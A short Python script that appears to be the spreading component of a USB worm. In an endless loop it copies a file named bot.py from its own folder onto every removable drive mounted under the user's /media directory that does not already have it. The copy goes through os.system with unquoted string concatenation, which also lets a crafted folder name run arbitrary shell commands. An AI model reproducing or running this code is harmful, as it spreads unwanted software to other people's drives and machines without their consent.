import os
import shutil
lofin = os.getlogin()
src = os.path.dirname(os.path.abspath(__file__))+"/bot.py"

while (1):
    if len(os.listdir("/media/"+lofin)) > 0:
        for clef in os.listdir("/media/"+lofin):
            os.path.isfile("/media/"+lofin+"/"+clef+"/bot.py")
            if not os.path.isfile("/media/"+lofin+"/"+clef+"/bot.py"):
                destination = "/media/"+lofin +"/" + str(clef)
                os.system("/bin/cp " + src + " " + destination)  
